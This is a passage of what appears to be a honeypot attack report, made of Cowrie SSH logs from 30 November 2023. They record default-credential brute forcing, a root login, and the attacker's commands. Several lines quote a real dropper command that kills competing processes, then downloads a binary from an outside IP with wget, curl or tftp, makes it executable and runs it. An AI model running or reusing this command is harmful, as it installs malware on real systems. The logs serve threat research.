2023-11-30T01:42:57.566448Z [HoneyPotSSHTransport,46,204.76.203.13] Saved redir contents with SHA-256 199d11d0fd7043fe9206954ed8bc7b54d1912013a2a71bdf8bb007b71bb490c8 to var/lib/cowrie/downloads/199d11d0fd7043fe9206954ed8bc7b54d1912013a2a71bdf8bb007b71bb490c8
2023-11-30T01:42:57.567406Z [HoneyPotSSHTransport,46,204.76.203.13] Closing TTY Log: var/lib/cowrie/tty/35418a8d6dcb23a0ee6716fc1f7ae2255bd9f34584706ff5b8c6f8f42b98100f after 50 seconds
2023-11-30T01:42:57.643590Z [HoneyPotSSHTransport,46,204.76.203.13] avatar root logging out
2023-11-30T01:42:57.643806Z [HoneyPotSSHTransport,46,204.76.203.13] Connection lost after 51 seconds
2023-11-30T01:41:53.571325Z [HoneyPotSSHTransport,42,204.76.203.13] Remote SSH version: SSH-2.0-libssh2_1.10.0
2023-11-30T01:41:53.647609Z [HoneyPotSSHTransport,42,204.76.203.13] SSH client hassh fingerprint: 63ae64767f334c6a74647d80edb0291e
2023-11-30T01:41:54.047697Z [HoneyPotSSHTransport,42,204.76.203.13] first time for 204.76.203.13, need: 5
2023-11-30T01:41:54.047814Z [HoneyPotSSHTransport,42,204.76.203.13] login attempt: 1
2023-11-30T01:41:54.085794Z [HoneyPotSSHTransport,42,204.76.203.13] login attempt [b'admin'/b'admin'] failed
2023-11-30T01:41:55.166312Z [HoneyPotSSHTransport,42,204.76.203.13] Got remote error, code 11 reason: b'end'
2023-11-30T01:41:55.166817Z [HoneyPotSSHTransport,42,204.76.203.13] Connection lost after 1 seconds
2023-11-30T01:41:55.242107Z [HoneyPotSSHTransport,43,204.76.203.13] Remote SSH version: SSH-2.0-libssh2_1.10.0
2023-11-30T01:41:55.317557Z [HoneyPotSSHTransport,43,204.76.203.13] SSH client hassh fingerprint: 63ae64767f334c6a74647d80edb0291e
2023-11-30T01:41:55.711661Z [HoneyPotSSHTransport,43,204.76.203.13] login attempt: 2
2023-11-30T01:41:55.750345Z [HoneyPotSSHTransport,43,204.76.203.13] login attempt [b'admin'/b'password'] failed
2023-11-30T01:41:58.998769Z [HoneyPotSSHTransport,43,204.76.203.13] Got remote error, code 11 reason: b'end'
2023-11-30T01:41:58.999284Z [HoneyPotSSHTransport,43,204.76.203.13] Connection lost after 3 seconds
2023-11-30T01:41:59.075196Z [HoneyPotSSHTransport,44,204.76.203.13] Remote SSH version: SSH-2.0-libssh2_1.10.0
2023-11-30T01:42:02.031931Z [HoneyPotSSHTransport,44,204.76.203.13] SSH client hassh fingerprint: 63ae64767f334c6a74647d80edb0291e
2023-11-30T01:42:03.676742Z [HoneyPotSSHTransport,44,204.76.203.13] login attempt: 3
2023-11-30T01:42:03.714830Z [HoneyPotSSHTransport,44,204.76.203.13] login attempt [b'ubnt'/b'ubnt'] failed
2023-11-30T01:42:04.792951Z [HoneyPotSSHTransport,44,204.76.203.13] Got remote error, code 11 reason: b'end'
2023-11-30T01:42:04.793713Z [HoneyPotSSHTransport,44,204.76.203.13] Connection lost after 5 seconds
2023-11-30T01:42:04.868721Z [HoneyPotSSHTransport,45,204.76.203.13] Remote SSH version: SSH-2.0-libssh2_1.10.0
2023-11-30T01:42:04.944538Z [HoneyPotSSHTransport,45,204.76.203.13] SSH client hassh fingerprint: 63ae64767f334c6a74647d80edb0291e
2023-11-30T01:42:05.336281Z [HoneyPotSSHTransport,45,204.76.203.13] login attempt: 4
2023-11-30T01:42:05.373678Z [HoneyPotSSHTransport,45,204.76.203.13] login attempt [b'admin'/b'123456'] failed
2023-11-30T01:42:06.452556Z [HoneyPotSSHTransport,45,204.76.203.13] Got remote error, code 11 reason: b'end'
2023-11-30T01:42:06.453447Z [HoneyPotSSHTransport,45,204.76.203.13] Connection lost after 1 seconds
2023-11-30T01:42:06.528321Z [HoneyPotSSHTransport,46,204.76.203.13] Remote SSH version: SSH-2.0-libssh2_1.10.0
2023-11-30T01:42:06.603497Z [HoneyPotSSHTransport,46,204.76.203.13] SSH client hassh fingerprint: 63ae64767f334c6a74647d80edb0291e
2023-11-30T01:42:06.955516Z [HoneyPotSSHTransport,46,204.76.203.13] login attempt: 5
2023-11-30T01:42:06.993253Z [HoneyPotSSHTransport,46,204.76.203.13] login attempt [b'root'/b'root'] succeeded
2023-11-30T01:42:06.994875Z [HoneyPotSSHTransport,46,204.76.203.13] Initialized emulated server as architecture: linux-x64-lsb
2023-11-30T01:42:07.264680Z [HoneyPotSSHTransport,46,204.76.203.13] CMD: enable
2023-11-30T01:42:07.265628Z [HoneyPotSSHTransport,46,204.76.203.13] Command found: enable 
2023-11-30T01:42:07.265865Z [HoneyPotSSHTransport,46,204.76.203.13] Reading txtcmd from "share/cowrie/txtcmds/bin/enable"
2023-11-30T01:42:07.342616Z [HoneyPotSSHTransport,46,204.76.203.13] CMD: system
2023-11-30T01:42:07.343443Z [HoneyPotSSHTransport,46,204.76.203.13] Can't find command system
2023-11-30T01:42:07.343543Z [HoneyPotSSHTransport,46,204.76.203.13] Command not found: system
2023-11-30T01:42:07.344757Z [HoneyPotSSHTransport,46,204.76.203.13] CMD: shell
2023-11-30T01:42:07.345442Z [HoneyPotSSHTransport,46,204.76.203.13] Can't find command shell
2023-11-30T01:42:07.345546Z [HoneyPotSSHTransport,46,204.76.203.13] Command not found: shell
2023-11-30T01:42:07.346481Z [HoneyPotSSHTransport,46,204.76.203.13] CMD: sh
2023-11-30T01:42:07.346943Z [HoneyPotSSHTransport,46,204.76.203.13] Command found: sh 
2023-11-30T01:42:07.348235Z [HoneyPotSSHTransport,46,204.76.203.13] CMD: linuxshell
2023-11-30T01:42:07.348894Z [HoneyPotSSHTransport,46,204.76.203.13] Can't find command linuxshell
2023-11-30T01:42:07.349000Z [HoneyPotSSHTransport,46,204.76.203.13] Command not found: linuxshell
2023-11-30T01:42:07.354857Z [HoneyPotSSHTransport,46,204.76.203.13] CMD: cd /tmp/; echo "senpai" > rootsenpai; cat rootsenpai; rm -rf rootsenpai
2023-11-30T01:42:07.355450Z [HoneyPotSSHTransport,46,204.76.203.13] Command found: cd /tmp/
2023-11-30T01:42:07.355807Z [HoneyPotSSHTransport,46,204.76.203.13] Command found: echo senpai > rootsenpai
2023-11-30T01:42:07.356814Z [HoneyPotSSHTransport,46,204.76.203.13] Command found: cat rootsenpai
2023-11-30T01:42:07.357419Z [HoneyPotSSHTransport,46,204.76.203.13] Command found: rm -rf rootsenpai
2023-11-30T01:42:07.457483Z [HoneyPotSSHTransport,46,204.76.203.13] CMD: for dir in /proc/[0-9]*; do grep -q "(deleted)" "$dir/maps" && echo "Killing process with PID: $(basename $dir)" && kill -9 $(basename $dir); done;; rm -rf ah; wget http://94.156.68.152/ah || curl -O http://94.156.68.152/ah || tftp 94.156.68.152 -c get ah || tftp -g -r ah 94.156.68.152; chmod 777 ah;./ah ssh; rm -rf ah
2023-11-30T01:42:07.458423Z [HoneyPotSSHTransport,46,204.76.203.13] CMD: basename $dir
2023-11-30T01:42:07.459906Z [HoneyPotSSHTransport,46,204.76.203.13] Can't find command basename
2023-11-30T01:42:07.460015Z [HoneyPotSSHTransport,46,204.76.203.13] Command not found: basename $dir
2023-11-30T01:42:07.460604Z [HoneyPotSSHTransport,46,204.76.203.13] CMD: basename $dir
2023-11-30T01:42:07.461305Z [HoneyPotSSHTransport,46,204.76.203.13] Can't find command basename
2023-11-30T01:42:07.461404Z [HoneyPotSSHTransport,46,204.76.203.13] Command not found: basename $dir
2023-11-30T01:42:07.462372Z [HoneyPotSSHTransport,46,204.76.203.13] Can't find command for
2023-11-30T01:42:07.462472Z [HoneyPotSSHTransport,46,204.76.203.13] Command not found: for dir in /proc/ [ 0-9 ] *
2023-11-30T01:42:07.463164Z [HoneyPotSSHTransport,46,204.76.203.13] Can't find command deleted
2023-11-30T01:42:07.463262Z [HoneyPotSSHTransport,46,204.76.203.13] Command not found: deleted $dir/maps
2023-11-30T01:42:07.463781Z [HoneyPotSSHTransport,46,204.76.203.13] Command found: echo Killing process with PID: 
2023-11-30T01:42:07.464210Z [HoneyPotSSHTransport,46,204.76.203.13] Command found: kill -9 
2023-11-30T01:42:07.464521Z [HoneyPotSSHTransport,46,204.76.203.13] Command found: done ;; rm -rf ah
2023-11-30T01:42:07.464818Z [HoneyPotSSHTransport,46,204.76.203.13] Command found: wget http://94.156.68.152/ah
2023-11-30T01:42:57.566448Z [HoneyPotSSHTransport,46,204.76.203.13] Saved redir contents with SHA-256 199d11d0fd7043fe9206954ed8bc7b54d1912013a2a71bdf8bb007b71bb490c8 to var/lib/cowrie/downloads/199d11d0fd7043fe9206954ed8bc7b54d1912013a2a71bdf8bb007b71bb490c8
2023-11-30T01:42:57.567406Z [HoneyPotSSHTransport,46,204.76.203.13] Closing TTY Log: var/lib/cowrie/tty/35418a8d6dcb23a0ee6716fc1f7ae2255bd9f34584706ff5b8c6f8f42b98100f after 50 seconds
2023-11-30T01:42:57.643590Z [HoneyPotSSHTransport,46,204.76.203.13] avatar root logging out
2023-11-30T01:42:57.643806Z [HoneyPotSSHTransport,46,204.76.203.13] Connection lost after 51 seconds
2023-11-30T01:41:53.571325Z [HoneyPotSSHTransport,42,204.76.203.13] Remote SSH version: SSH-2.0-libssh2_1.10.0
2023-11-30T01:41:53.647609Z [HoneyPotSSHTransport,42,204.76.203.13] SSH client hassh fingerprint: 63ae64767f334c6a74647d80edb0291e
2023-11-30T01:41:54.047697Z [HoneyPotSSHTransport,42,204.76.203.13] first time for 204.76.203.13, need: 5
2023-11-30T01:41:54.047814Z [HoneyPotSSHTransport,42,204.76.203.13] login attempt: 1
2023-11-30T01:41:54.085794Z [HoneyPotSSHTransport,42,204.76.203.13] login attempt [b'admin'/b'admin'] failed
2023-11-30T01:41:55.166312Z [HoneyPotSSHTransport,42,204.76.203.13] Got remote error, code 11 reason: b'end'
2023-11-30T01:41:55.166817Z [HoneyPotSSHTransport,42,204.76.203.13] Connection lost after 1 seconds
2023-11-30T01:41:55.242107Z [HoneyPotSSHTransport,43,204.76.203.13] Remote SSH version: SSH-2.0-libssh2_1.10.0
2023-11-30T01:41:55.317557Z [HoneyPotSSHTransport,43,204.76.203.13] SSH client hassh fingerprint: 63ae64767f334c6a74647d80edb0291e
2023-11-30T01:41:55.711661Z [HoneyPotSSHTransport,43,204.76.203.13] login attempt: 2
2023-11-30T01:41:55.750345Z [HoneyPotSSHTransport,43,204.76.203.13] login attempt [b'admin'/b'password'] failed
2023-11-30T01:41:58.998769Z [HoneyPotSSHTransport,43,204.76.203.13] Got remote error, code 11 reason: b'end'
2023-11-30T01:41:58.999284Z [HoneyPotSSHTransport,43,204.76.203.13] Connection lost after 3 seconds
2023-11-30T01:41:59.075196Z [HoneyPotSSHTransport,44,204.76.203.13] Remote SSH version: SSH-2.0-libssh2_1.10.0
2023-11-30T01:42:02.031931Z [HoneyPotSSHTransport,44,204.76.203.13] SSH client hassh fingerprint: 63ae64767f334c6a74647d80edb0291e
2023-11-30T01:42:03.676742Z [HoneyPotSSHTransport,44,204.76.203.13] login attempt: 3
2023-11-30T01:42:03.714830Z [HoneyPotSSHTransport,44,204.76.203.13] login attempt [b'ubnt'/b'ubnt'] failed
2023-11-30T01:42:04.792951Z [HoneyPotSSHTransport,44,204.76.203.13] Got remote error, code 11 reason: b'end'
2023-11-30T01:42:04.793713Z [HoneyPotSSHTransport,44,204.76.203.13] Connection lost after 5 seconds
2023-11-30T01:42:04.868721Z [HoneyPotSSHTransport,45,204.76.203.13] Remote SSH version: SSH-2.0-libssh2_1.10.0
2023-11-30T01:42:04.944538Z [HoneyPotSSHTransport,45,204.76.203.13] SSH client hassh fingerprint: 63ae64767f334c6a74647d80edb0291e
2023-11-30T01:42:05.336281Z [HoneyPotSSHTransport,45,204.76.203.13] login attempt: 4
2023-11-30T01:42:05.373678Z [HoneyPotSSHTransport,45,204.76.203.13] login attempt [b'admin'/b'123456'] failed
2023-11-30T01:42:06.452556Z [HoneyPotSSHTransport,45,204.76.203.13] Got remote error, code 11 reason: b'end'
2023-11-30T01:42:06.453447Z [HoneyPotSSHTransport,45,204.76.203.13] Connection lost after 1 seconds
2023-11-30T01:42:06.528321Z [HoneyPotSSHTransport,46,204.76.203.13] Remote SSH version: SSH-2.0-libssh2_1.10.0
2023-11-30T01:42:06.603497Z [HoneyPotSSHTransport,46,204.76.203.13] SSH client hassh fingerprint: 63ae64767f334c6a74647d80edb0291e
2023-11-30T01:42:06.955516Z [HoneyPotSSHTransport,46,204.76.203.13] login attempt: 5
2023-11-30T01:42:06.993253Z [HoneyPotSSHTransport,46,204.76.203.13] login attempt [b'root'/b'root'] succeeded
2023-11-30T01:42:06.994875Z [HoneyPotSSHTransport,46,204.76.203.13] Initialized emulated server as architecture: linux-x64-lsb
2023-11-30T01:42:07.264680Z [HoneyPotSSHTransport,46,204.76.203.13] CMD: enable
2023-11-30T01:42:07.265628Z [HoneyPotSSHTransport,46,204.76.203.13] Command found: enable 
2023-11-30T01:42:07.265865Z [HoneyPotSSHTransport,46,204.76.203.13] Reading txtcmd from "share/cowrie/txtcmds/bin/enable"
2023-11-30T01:42:07.342616Z [HoneyPotSSHTransport,46,204.76.203.13] CMD: system
2023-11-30T01:42:07.343443Z [HoneyPotSSHTransport,46,204.76.203.13] Can't find command system
2023-11-30T01:42:07.343543Z [HoneyPotSSHTransport,46,204.76.203.13] Command not found: system
2023-11-30T01:42:07.344757Z [HoneyPotSSHTransport,46,204.76.203.13] CMD: shell
2023-11-30T01:42:07.345442Z [HoneyPotSSHTransport,46,204.76.203.13] Can't find command shell
2023-11-30T01:42:07.345546Z [HoneyPotSSHTransport,46,204.76.203.13] Command not found: shell
2023-11-30T01:42:07.346481Z [HoneyPotSSHTransport,46,204.76.203.13] CMD: sh
2023-11-30T01:42:07.346943Z [HoneyPotSSHTransport,46,204.76.203.13] Command found: sh 
2023-11-30T01:42:07.348235Z [HoneyPotSSHTransport,46,204.76.203.13] CMD: linuxshell
2023-11-30T01:42:07.348894Z [HoneyPotSSHTransport,46,204.76.203.13] Can't find command linuxshell
2023-11-30T01:42:07.349000Z [HoneyPotSSHTransport,46,204.76.203.13] Command not found: linuxshell
2023-11-30T01:42:07.354857Z [HoneyPotSSHTransport,46,204.76.203.13] CMD: cd /tmp/; echo "senpai" > rootsenpai; cat rootsenpai; rm -rf rootsenpai
2023-11-30T01:42:07.355450Z [HoneyPotSSHTransport,46,204.76.203.13] Command found: cd /tmp/
2023-11-30T01:42:07.355807Z [HoneyPotSSHTransport,46,204.76.203.13] Command found: echo senpai > rootsenpai
2023-11-30T01:42:07.356814Z [HoneyPotSSHTransport,46,204.76.203.13] Command found: cat rootsenpai
2023-11-30T01:42:07.357419Z [HoneyPotSSHTransport,46,204.76.203.13] Command found: rm -rf rootsenpai
2023-11-30T01:42:07.457483Z [HoneyPotSSHTransport,46,204.76.203.13] CMD: for dir in /proc/[0-9]*; do grep -q "(deleted)" "$dir/maps" && echo "Killing process with PID: $(basename $dir)" && kill -9 $(basename $dir); done;; rm -rf ah; wget http://94.156.68.152/ah || curl -O http://94.156.68.152/ah || tftp 94.156.68.152 -c get ah || tftp -g -r ah 94.156.68.152; chmod 777 ah;./ah ssh; rm -rf ah
2023-11-30T01:42:07.458423Z [HoneyPotSSHTransport,46,204.76.203.13] CMD: basename $dir
2023-11-30T01:42:07.459906Z [HoneyPotSSHTransport,46,204.76.203.13] Can't find command basename
2023-11-30T01:42:07.460015Z [HoneyPotSSHTransport,46,204.76.203.13] Command not found: basename $dir
2023-11-30T01:42:07.460604Z [HoneyPotSSHTransport,46,204.76.203.13] CMD: basename $dir
2023-11-30T01:42:07.461305Z [HoneyPotSSHTransport,46,204.76.203.13] Can't find command basename
2023-11-30T01:42:07.461404Z [HoneyPotSSHTransport,46,204.76.203.13] Command not found: basename $dir
2023-11-30T01:42:07.462372Z [HoneyPotSSHTransport,46,204.76.203.13] Can't find command for
2023-11-30T01:42:07.462472Z [HoneyPotSSHTransport,46,204.76.203.13] Command not found: for dir in /proc/ [ 0-9 ] *
2023-11-30T01:42:07.463164Z [HoneyPotSSHTransport,46,204.76.203.13] Can't find command deleted
2023-11-30T01:42:07.463262Z [HoneyPotSSHTransport,46,204.76.203.13] Command not found: deleted $dir/maps
2023-11-30T01:42:07.463781Z [HoneyPotSSHTransport,46,204.76.203.13] Command found: echo Killing process with PID: 
2023-11-30T01:42:07.464210Z [HoneyPotSSHTransport,46,204.76.203.13] Command found: kill -9 
2023-11-30T01:42:07.464521Z [HoneyPotSSHTransport,46,204.76.203.13] Command found: done ;; rm -rf ah
2023-11-30T01:42:07.464818Z [HoneyPotSSHTransport,46,204.76.203.13] Command found: wget http://94.156.68.152/ah
2023-11-30T01:42:57.566448Z [HoneyPotSSHTransport,46,204.76.203.13] Saved redir contents with SHA-256 199d11d0fd7043fe9206954ed8bc7b54d1912013a2a71bdf8bb007b71bb490c8 to var/lib/cowrie/downloads/199d11d0fd7043fe9206954ed8bc7b54d1912013a2a71bdf8bb007b71bb490c8
2023-11-30T01:42:57.567406Z [HoneyPotSSHTransport,46,204.76.203.13] Closing TTY Log: var/lib/cowrie/tty/35418a8d6dcb23a0ee6716fc1f7ae2255bd9f34584706ff5b8c6f8f42b98100f after 50 seconds
2023-11-30T01:42:57.643590Z [HoneyPotSSHTransport,46,204.76.203.13] avatar root logging out
2023-11-30T01:42:57.643806Z [HoneyPotSSHTransport,46,204.76.203.13] Connection lost after 51 seconds

```

</details>

---


## Cowrie .json Logs
Total Cowrie logs: `94`

#### First Session With Commands 651b145b8fb8 Cowrie .json Logs
This sample shows the Cowrie `.json` Logs for session_id `651b145b8fb8` the first session in this attack where the attacker exectuted commands in on the honeypot system.Here is the full log:

<details>
<summary>
<h3>Cowrie .json Logs for 651b145b8fb8</h3>
</summary>


```json
{"eventid":"cowrie.session.connect","src_ip":"204.76.203.13","src_port":54330,"dst_ip":"172.31.5.68","dst_port":2222,"session":"651b145b8fb8","protocol":"ssh","message":"New connection: 204.76.203.13:54330 (172.31.5.68:2222) [session: 651b145b8fb8]","sensor":"","timestamp":"2023-11-30T01:42:06.527180Z"}
{"eventid":"cowrie.client.version","version":"SSH-2.0-libssh2_1.10.0","message":"Remote SSH version: SSH-2.0-libssh2_1.10.0","sensor":"","timestamp":"2023-11-30T01:42:06.528321Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.client.kex","hassh":"63ae64767f334c6a74647d80edb0291e","hasshAlgorithms":"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group-exchange-sha256,diffie-hellman-group16-sha512,diffie-hellman-group18-sha512,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,diffie-hellman-group-exchange-sha1;aes128-ctr,aes192-ctr,aes256-ctr,aes256-cbc,rijndael-cbc@lysator.liu.se,aes192-cbc,aes128-cbc,blowfish-cbc,arcfour128,arcfour,cast128-cbc,3des-cbc,none;hmac-sha2-256,hmac-sha2-512,hmac-sha1,hmac-sha1-96,hmac-md5,hmac-md5-96,hmac-ripemd160,hmac-ripemd160@openssh.com,none;none","kexAlgs":["curve25519-sha256","curve25519-sha256@libssh.org","ecdh-sha2-nistp256","ecdh-sha2-nistp384","ecdh-sha2-nistp521","diffie-hellman-group-exchange-sha256","diffie-hellman-group16-sha512","diffie-hellman-group18-sha512","diffie-hellman-group14-sha256","diffie-hellman-group14-sha1","diffie-hellman-group1-sha1","diffie-hellman-group-exchange-sha1"],"keyAlgs":["ecdsa-sha2-nistp256","ecdsa-sha2-nistp384","ecdsa-sha2-nistp521","ecdsa-sha2-nistp256-cert-v01@openssh.com","ecdsa-sha2-nistp384-cert-v01@openssh.com","ecdsa-sha2-nistp521-cert-v01@openssh.com","ssh-ed25519","ssh-rsa","ssh-dss"],"encCS":["aes128-ctr","aes192-ctr","aes256-ctr","aes256-cbc","rijndael-cbc@lysator.liu.se","aes192-cbc","aes128-cbc","blowfish-cbc","arcfour128","arcfour","cast128-cbc","3des-cbc","none"],"macCS":["hmac-sha2-256","hmac-sha2-512","hmac-sha1","hmac-sha1-96","hmac-md5","hmac-md5-96","hmac-ripemd160","hmac-ripemd160@openssh.com","none"],"compCS":["none"],"langCS":[""],"message":"SSH client hassh fingerprint: 63ae64767f334c6a74647d80edb0291e","sensor":"","timestamp":"2023-11-30T01:42:06.603497Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.login.success","username":"root","password":"root","message":"login attempt [root/root] succeeded","sensor":"","timestamp":"2023-11-30T01:42:06.993253Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.session.params","arch":"linux-x64-lsb","message":[],"sensor":"","timestamp":"2023-11-30T01:42:07.187733Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.input","input":"enable","message":"CMD: enable","sensor":"","timestamp":"2023-11-30T01:42:07.264680Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.input","input":"system","message":"CMD: system","sensor":"","timestamp":"2023-11-30T01:42:07.342616Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.failed","input":"system","message":"Command not found: system","sensor":"","timestamp":"2023-11-30T01:42:07.343543Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.input","input":"shell","message":"CMD: shell","sensor":"","timestamp":"2023-11-30T01:42:07.344757Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.failed","input":"shell","message":"Command not found: shell","sensor":"","timestamp":"2023-11-30T01:42:07.345546Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.input","input":"sh","message":"CMD: sh","sensor":"","timestamp":"2023-11-30T01:42:07.346481Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.input","input":"linuxshell","message":"CMD: linuxshell","sensor":"","timestamp":"2023-11-30T01:42:07.348235Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.failed","input":"linuxshell","message":"Command not found: linuxshell","sensor":"","timestamp":"2023-11-30T01:42:07.349000Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.input","input":"cd /tmp/; echo \"senpai\" > rootsenpai; cat rootsenpai; rm -rf rootsenpai","message":"CMD: cd /tmp/; echo \"senpai\" > rootsenpai; cat rootsenpai; rm -rf rootsenpai","sensor":"","timestamp":"2023-11-30T01:42:07.354857Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.input","input":"for dir in /proc/[0-9]*; do grep -q \"(deleted)\" \"$dir/maps\" && echo \"Killing process with PID: $(basename $dir)\" && kill -9 $(basename $dir); done;; rm -rf ah; wget http://94.156.68.152/ah || curl -O http://94.156.68.152/ah || tftp 94.156.68.152 -c get ah || tftp -g -r ah 94.156.68.152; chmod 777 ah;./ah ssh; rm -rf ah","message":"CMD: for dir in /proc/[0-9]*; do grep -q \"(deleted)\" \"$dir/maps\" && echo \"Killing process with PID: $(basename $dir)\" && kill -9 $(basename $dir); done;; rm -rf ah; wget http://94.156.68.152/ah || curl -O http://94.156.68.152/ah || tftp 94.156.68.152 -c get ah || tftp -g -r ah 94.156.68.152; chmod 777 ah;./ah ssh; rm -rf ah","sensor":"","timestamp":"2023-11-30T01:42:07.457483Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.input","input":"basename $dir","message":"CMD: basename $dir","sensor":"","timestamp":"2023-11-30T01:42:07.458423Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.failed","input":"basename $dir","message":"Command not found: basename $dir","sensor":"","timestamp":"2023-11-30T01:42:07.460015Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.input","input":"basename $dir","message":"CMD: basename $dir","sensor":"","timestamp":"2023-11-30T01:42:07.460604Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.failed","input":"basename $dir","message":"Command not found: basename $dir","sensor":"","timestamp":"2023-11-30T01:42:07.461404Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.failed","input":"for dir in /proc/ [ 0-9 ] *","message":"Command not found: for dir in /proc/ [ 0-9 ] *","sensor":"","timestamp":"2023-11-30T01:42:07.462472Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.failed","input":"deleted $dir/maps","message":"Command not found: deleted $dir/maps","sensor":"","timestamp":"2023-11-30T01:42:07.463262Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.session.file_download","url":"http://94.156.68.152/ah","outfile":"var/lib/cowrie/downloads/fe9291a4727da7f6f40763c058b88a5b0031ee5e1f6c8d71cc4b55387594c054","shasum":"fe9291a4727da7f6f40763c058b88a5b0031ee5e1f6c8d71cc4b55387594c054","sensor":"","timestamp":"2023-11-30T01:42:07.748981Z","message":"Downloaded URL (http://94.156.68.152/ah) with SHA-256 fe9291a4727da7f6f40763c058b88a5b0031ee5e1f6c8d71cc4b55387594c054 to var/lib/cowrie/downloads/fe9291a4727da7f6f40763c058b88a5b0031ee5e1f6c8d71cc4b55387594c054","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.session.file_download","url":"http://94.156.68.152/ah","outfile":"var/lib/cowrie/downloads/fe9291a4727da7f6f40763c058b88a5b0031ee5e1f6c8d71cc4b55387594c054","shasum":"fe9291a4727da7f6f40763c058b88a5b0031ee5e1f6c8d71cc4b55387594c054","sensor":"","timestamp":"2023-11-30T01:42:08.032984Z","message":"Downloaded URL (http://94.156.68.152/ah) with SHA-256 fe9291a4727da7f6f40763c058b88a5b0031ee5e1f6c8d71cc4b55387594c054 to var/lib/cowrie/downloads/fe9291a4727da7f6f40763c058b88a5b0031ee5e1f6c8d71cc4b55387594c054","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.session.file_download.failed","url":"http://94.156.68.152/ah","sensor":"","timestamp":"2023-11-30T01:42:23.066389Z","message":"Attempt to download file(s) from URL (http://94.156.68.152/ah) failed","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.session.file_download","duplicate":false,"outfile":"var/lib/cowrie/downloads/199d11d0fd7043fe9206954ed8bc7b54d1912013a2a71bdf8bb007b71bb490c8","shasum":"199d11d0fd7043fe9206954ed8bc7b54d1912013a2a71bdf8bb007b71bb490c8","destfile":"/tmp/rootsenpai","message":"Saved redir contents with SHA-256 199d11d0fd7043fe9206954ed8bc7b54d1912013a2a71bdf8bb007b71bb490c8 to var/lib/cowrie/downloads/199d11d0fd7043fe9206954ed8bc7b54d1912013a2a71bdf8bb007b71bb490c8","sensor":"","timestamp":"2023-11-30T01:42:57.566448Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.log.closed","ttylog":"var/lib/cowrie/tty/35418a8d6dcb23a0ee6716fc1f7ae2255bd9f34584706ff5b8c6f8f42b98100f","size":2745,"shasum":"35418a8d6dcb23a0ee6716fc1f7ae2255bd9f34584706ff5b8c6f8f42b98100f","duplicate":false,"duration":50.38083243370056,"message":"Closing TTY Log: var/lib/cowrie/tty/35418a8d6dcb23a0ee6716fc1f7ae2255bd9f34584706ff5b8c6f8f42b98100f after 50 seconds","sensor":"","timestamp":"2023-11-30T01:42:57.567406Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.session.closed","duration":51.115936279296875,"message":"Connection lost after 51 seconds","sensor":"","timestamp":"2023-11-30T01:42:57.643806Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.session.connect","src_ip":"204.76.203.13","src_port":54330,"dst_ip":"172.31.5.68","dst_port":2222,"session":"651b145b8fb8","protocol":"ssh","message":"New connection: 204.76.203.13:54330 (172.31.5.68:2222) [session: 651b145b8fb8]","sensor":"","timestamp":"2023-11-30T01:42:06.527180Z"}
{"eventid":"cowrie.client.version","version":"SSH-2.0-libssh2_1.10.0","message":"Remote SSH version: SSH-2.0-libssh2_1.10.0","sensor":"","timestamp":"2023-11-30T01:42:06.528321Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.client.kex","hassh":"63ae64767f334c6a74647d80edb0291e","hasshAlgorithms":"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group-exchange-sha256,diffie-hellman-group16-sha512,diffie-hellman-group18-sha512,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,diffie-hellman-group-exchange-sha1;aes128-ctr,aes192-ctr,aes256-ctr,aes256-cbc,rijndael-cbc@lysator.liu.se,aes192-cbc,aes128-cbc,blowfish-cbc,arcfour128,arcfour,cast128-cbc,3des-cbc,none;hmac-sha2-256,hmac-sha2-512,hmac-sha1,hmac-sha1-96,hmac-md5,hmac-md5-96,hmac-ripemd160,hmac-ripemd160@openssh.com,none;none","kexAlgs":["curve25519-sha256","curve25519-sha256@libssh.org","ecdh-sha2-nistp256","ecdh-sha2-nistp384","ecdh-sha2-nistp521","diffie-hellman-group-exchange-sha256","diffie-hellman-group16-sha512","diffie-hellman-group18-sha512","diffie-hellman-group14-sha256","diffie-hellman-group14-sha1","diffie-hellman-group1-sha1","diffie-hellman-group-exchange-sha1"],"keyAlgs":["ecdsa-sha2-nistp256","ecdsa-sha2-nistp384","ecdsa-sha2-nistp521","ecdsa